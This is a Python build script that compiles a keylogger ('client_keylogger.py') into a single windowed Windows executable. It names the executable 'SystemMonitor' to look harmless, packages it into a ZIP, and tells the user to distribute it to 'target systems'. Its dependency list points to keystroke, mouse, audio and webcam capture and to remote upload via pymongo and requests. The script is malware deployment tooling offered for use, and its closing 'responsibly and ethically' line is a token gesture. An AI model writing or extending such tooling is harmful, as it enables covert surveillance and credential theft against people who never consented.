import os
import subprocess
import sys
import shutil
import zipfile

def check_dependencies():
    """Check if required modules are installed"""
    print("Checking for required Python modules...")
    
    # Must-have modules - these are essential
    essential_modules = [
        "PyInstaller",
        "pymongo",
        "pynput",
        "requests",
        "tkinter"  # should be built into Python, but check anyway
    ]
    
    # Optional modules - these enhance functionality but aren't required
    optional_modules = [
        "pillow",
        "cryptography",
        "scipy",
        "sounddevice",
        "opencv-python"
    ]
    
    # Check essential modules
    missing_essential = []
    for module in essential_modules:
        try:
            if module == "tkinter":
                import tkinter
            else:
                __import__(module.replace("-", "_"))
            print(f"✓ {module} is installed")
        except ImportError:
            missing_essential.append(module)
            print(f"✗ {module} is missing (REQUIRED)")
    
    # Check optional modules
    missing_optional = []
    for module in optional_modules:
        try:
            __import__(module.replace("-", "_"))
            print(f"✓ {module} is installed")
        except ImportError:
            missing_optional.append(module)
            print(f"? {module} is missing (optional)")
    
    # Handle missing dependencies
    if missing_essential:
        print("\nERROR: Essential modules are missing. Please install:")
        print(f"pip install {' '.join(missing_essential)}")
        return False
    
    if missing_optional:
        print("\nWARNING: Some optional modules are missing.")
        print("The keylogger will still work but with reduced functionality.")
        print(f"For full functionality, install: pip install {' '.join(missing_optional)}")
    
    return True

def compile_executable():
    """Compile the client keylogger to an executable"""
    print("\nCompiling executable with PyInstaller...")
    
    # Clear any existing build files
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    
    # PyInstaller command with appropriate options
    cmd = [
        "pyinstaller",
        "--onefile",  # Create a single executable file
        "--windowed",  # Windows app without console
        "--icon=icon.ico" if os.path.exists("icon.ico") else "",  # Custom icon if available
        "--name=SystemMonitor",  # Name of the executable
        "--add-data=icon.ico;." if os.path.exists("icon.ico") else "",  # Include icon
        "--hidden-import=pynput.keyboard._win32",  # Required imports
        "--hidden-import=pynput.mouse._win32",
        "client_keylogger.py"  # Source file
    ]
    
    # Remove empty options
    cmd = [x for x in cmd if x]
    
    try:
        subprocess.run(cmd, check=True)
        print("✓ Executable compiled successfully")
        return True
    except subprocess.CalledProcessError as e:
        print(f"✗ Error compiling executable: {str(e)}")
        return False

def create_distribution_package():
    """Create a ZIP file for distribution"""
    print("\nCreating distribution package...")
    
    # Check if executable was built
    exe_path = "dist/SystemMonitor.exe"
    if not os.path.exists(exe_path):
        print("✗ Executable file not found")
        return False
    
    # Create a ZIP file
    try:
        zip_filename = "SystemMonitor.zip"
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(exe_path, os.path.basename(exe_path))
            
            # Include README if available
            if os.path.exists("README_CLIENT.md"):
                zipf.write("README_CLIENT.md", "README.md")
            
        print(f"✓ Distribution package created: {zip_filename}")
        return True
    except Exception as e:
        print(f"✗ Error creating distribution package: {str(e)}")
        return False

def main():
    print("===== Keylogger Client Executable Builder =====")
    
    # Check if client_keylogger.py exists
    if not os.path.exists("client_keylogger.py"):
        print("✗ client_keylogger.py not found")
        return False
    
    # Check dependencies
    if not check_dependencies():
        return False
    
    # Create icon if it doesn't exist
    if not os.path.exists("icon.ico"):
        print("\nIcon file not found. A default icon will be used.")
    
    # Compile executable
    if not compile_executable():
        return False
    
    # Create distribution package
    if not create_distribution_package():
        return False
    
    print("\n===== Build Complete =====")
    print("You can distribute the SystemMonitor.zip file to target systems.")
    print("IMPORTANT: Use this software responsibly and ethically.")
    
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)